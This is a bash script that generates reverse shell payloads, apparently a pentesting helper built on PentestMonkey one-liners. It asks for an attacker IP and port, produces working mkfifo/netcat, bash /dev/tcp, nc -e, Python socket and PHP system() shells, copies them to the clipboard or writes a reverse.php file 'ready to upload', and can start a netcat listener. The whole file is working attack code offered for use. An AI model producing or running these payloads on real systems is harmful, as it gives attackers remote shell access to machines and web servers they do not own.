#!/bin/bash


#Definition of colours to make the display beautiful

boring="\e[0m" 	#no colour - Used for variables like ip address and ports
red="\e[1;31m" 	#red - Used for displaying the copied onliner
green="\e[1;32m"	#green - Used for helper texts which displays variables
blue="\e[1;34m"	#blue - Used for helper texts which gets inputs
hackergreen="\e[0;32m"  #dark green - Used for making things look nice
purple="\e[1;35m" 	#purple - idk


#Configuration of the reverse shell


echo -ne "${blue}Listening Port:${boring} " && read PORT

echo ""

echo -ne "${green}These are your IP addresses:${purple}\n"

hostname -I

echo ""

echo -ne "${blue}Choose the IP address you want to use from above:${boring} "  && read IP

echo ""


#PentestMonkey Reverse Shell Options


echo -ne "${blue}Which type of reverse shell command line do you want to use?${boring}"

rm="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"

bash="bash -i >& /dev/tcp/$IP/$PORT 0>&1"

nc="nc -e /bin/sh $IP $PORT"

python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"

php='<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '$IP' '$PORT' >/tmp/f") ?>'


#Display of the reverse shell

echo ""
copied="${green}We have copied it to your clipboard!!! Paste it wherever you want:)${boring}\n\n"
select reverse in rm bash nc python php
do
	case $reverse in
		rm)
			echo -ne "${green}You have selected the 'rm' payload\n${boring}"
			echo -ne $rm | xclip -sel clip | echo -ne "${red}$rm${boring}\n\n"
			echo -ne "$copied"
			break;;
		bash)
			echo -ne "${green}You have selected the 'bash' payload\n${boring}"
			echo $bash | xclip -sel clip | echo -ne "${red}$bash${boring}\n\n"
			echo -ne "$copied"
			break;;
		nc)
			echo -ne "${green}You have selected the 'nc' or netcat payload\n${boring}"
			echo $nc | xclip -sel clip | echo -ne "${red}$nc${boring}\n\n"
			echo -ne "$copied"
			break;;
		python)
			echo -ne "${green}You have selected the 'python' payload\n${boring}"
			echo $python | xclip -sel clip | echo -ne "${red}$python${boring}\n\n"
			echo -ne "$copied"
			break;;
		php)
			echo -ne "${green}You have selected the 'php' payload\n${boring}"
			echo -ne $php > reverse.php | echo -ne "${red}The file reverse.php is ready to upload and located in ${green}" ; pwd
			echo -ne "$copied"
			break;;
		*)
			echo -ne "${green}You have selected something else\n${boring}";;
	esac
done

echo -ne "${blue}Do you want to open a shell and listen here itself?${hackergreen} (Y/N)  ${boring}" && read option

if [[ $option = 'Y' ]] || [[ $option = 'y' ]]
then
	#Netcal listener definition
	
	echo -ne "${hackergreen}Waiting to say I'm in...${boring}\n"
	echo -ne "${red}Listening on Port ${boring}$PORT\n\n"

	sudo nc -nlvp $PORT

else
	echo -ne "${purple}BYE\n\n"
	exit
fi	
